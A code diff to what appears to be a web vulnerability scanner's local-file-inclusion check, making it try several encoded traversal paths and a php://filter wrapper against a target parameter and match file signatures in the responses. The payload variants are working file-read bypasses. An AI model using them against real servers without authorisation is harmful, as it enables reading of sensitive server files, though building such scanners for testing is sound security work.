@@ -1,6 +1,6 @@
 import statistics
 import time
-from typing import Dict, Optional
+from typing import Dict, List, Optional
 
 import requests
 
@@ -219,14 +219,18 @@ def verify_lfi_content(url: str, param: str, sess: requests.Session,
     confirmed = 0
     max_confidence = 0.0
     for filepath, signatures in known_signatures.items():
-        try:
-            r = sess.get(build_url(url, param, _lfi_encode_path(filepath)), timeout=timeout)
+        file_hit = False
+        for encoded in _lfi_encode_path(filepath):
+            try:
+                r = sess.get(build_url(url, param, encoded), timeout=timeout)
+            except Exception:
+                continue
             if r.status_code == 200 and len(r.text) > 20:
                 for pattern, weight in signatures:
                     if pattern in r.text:
                         confirmed += 1
-                        confidence = max(max_confidence, weight)
-                        max_confidence = max(max_confidence, confidence)
+                        max_confidence = max(max_confidence, weight)
+                        file_hit = True
                         result["evidence"].append({
                             "file": filepath,
                             "pattern": pattern[:50],
@@ -235,10 +239,10 @@ def verify_lfi_content(url: str, param: str, sess: requests.Session,
                         })
                         if confirmed >= 3:
                             break
-                if confirmed >= 3:
-                    break
-        except Exception:
-            continue
+            if file_hit:
+                break
+        if confirmed >= 3:
+            break
 
     if confirmed >= 2:
         result["vulnerable"] = True
@@ -272,7 +276,8 @@ def _get_baseline_response(url: str, param: str, sess: requests.Session,
         return None
 
 
-def _lfi_encode_path(path: str) -> str:
+def _lfi_encode_path(path: str) -> List[str]:
+    """返回按优先级排序的 LFI payload 变体: 原样 → 编码绕过 → 包装器."""
     encodings = [path, path.replace("/", "%2f"), path.replace("/", "%252f")]
     for p in path.split("/"):
         if p:
@@ -283,7 +288,7 @@ def _lfi_encode_path(path: str) -> str:
         encodings.append("..%2f..%2f..%2f..%2f" + path[1:])
         php_filter = "php://filter/convert.base64-encode/resource=" + path
         encodings.append(php_filter)
-    return encodings[0]
+    return encodings
 
 
 def verify_finding(vtype: str, url: str, param: str, sess: requests.Session,
